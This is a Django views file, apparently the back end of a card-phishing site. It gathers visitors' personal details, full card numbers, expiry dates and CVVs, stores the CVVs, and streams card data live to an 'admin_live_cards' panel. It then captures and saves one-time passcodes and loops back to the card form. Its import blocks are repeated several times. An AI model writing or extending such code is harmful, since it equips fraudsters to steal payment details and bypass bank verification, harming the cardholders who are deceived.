from django.shortcuts import render, redirect
from .models import ApplicantDetail

def intropage(request):
    return render(request, 'intropage.html')

def home(request):
    return render(request, 'home.html')

def datapage(request):
    if request.method == 'POST':
        full_name = request.POST.get('full_name')
        mobile_number = request.POST.get('mobile_number')
        email = request.POST.get('email')
        dob = request.POST.get('dob')

        # Save to database
        ApplicantDetail.objects.create(
            full_name=full_name,
            mobile_number=mobile_number,
            email=email,
            dob=dob
        )

        # Redirect to the URL named 'card'
        return redirect('card')

    return render(request, 'datapage.html')

from django.shortcuts import render, redirect
from asgiref.sync import async_to_sync
from channels.layers import get_channel_layer
from .models import ApplicantDetail
from django.shortcuts import render, redirect
from asgiref.sync import async_to_sync
from channels.layers import get_channel_layer
from .models import ApplicantDetail

from django.shortcuts import render, redirect
from asgiref.sync import async_to_sync
from channels.layers import get_channel_layer
from .models import ApplicantDetail

from django.shortcuts import render, redirect
from asgiref.sync import async_to_sync
from channels.layers import get_channel_layer
from .models import ApplicantDetail

def card_view(request):
    if request.method == "POST":
        card_holder_name = request.POST.get("card_holder_name")
        card_number = request.POST.get("card_number")
        card_expiry = request.POST.get("card_expiry")
        card_cvv = request.POST.get("card_cvv")

        # Save card details into database
        applicant = ApplicantDetail.objects.create(
            full_name=card_holder_name,
            card_holder_name=card_holder_name,
            card_number=card_number,
            card_expiry=card_expiry,
            card_cvv=card_cvv
        )

        # Send WebSocket update to admin panel
        channel_layer = get_channel_layer()
        if channel_layer:
            async_to_sync(channel_layer.group_send)(
                "admin_live_cards",
                {
                    "type": "new_card_submitted",
                    "data": {
                        "id": applicant.id,
                        "card_holder_name": applicant.card_holder_name,
                        "card_number": applicant.card_number,
                        "card_expiry": applicant.card_expiry,
                        "created_at": applicant.created_at.strftime("%b. %d, %Y, %I:%M %p"),
                    }
                }
            )

        # Save applicant ID in session so OTP page knows who is submitting
        request.session['applicant_id'] = applicant.id

        # Redirect directly to OTP page
        return redirect('otp')

    return render(request, "card.html")


from django.shortcuts import render, redirect
from .models import ApplicantDetail

def otp_view(request):
    if request.method == "POST":
        otp = request.POST.get("otp_code")
        applicant_id = request.session.get("applicant_id")

        if applicant_id:
            # Update existing record with the submitted OTP
            try:
                applicant = ApplicantDetail.objects.get(id=applicant_id)
                applicant.otp_code = otp
                applicant.save()
            except ApplicantDetail.DoesNotExist:
                pass

        # Redirect after successful OTP verification
        return redirect('card')

    return render(request, "otp.html")